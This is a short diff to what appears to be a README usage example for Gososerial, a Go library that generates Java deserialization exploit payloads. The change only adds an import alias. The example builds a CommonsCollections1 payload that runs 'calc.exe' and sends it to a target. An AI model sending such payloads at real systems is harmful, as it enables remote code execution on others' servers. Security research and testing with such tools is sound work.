@@ -37,12 +37,12 @@ go get github.com/EmYiQing/Gososerial
 package main
 
 import (
-	"github.com/EmYiQing/Gososerial"
+	gososerial "github.com/EmYiQing/Gososerial"
 	"net/http"
 )
 
 func main()  {
-	payload := Gososerial.GetCC1("calc.exe")
+	payload := gososerial.GetCC1("calc.exe")
 	....
 	sendPayload(payload)
 	......
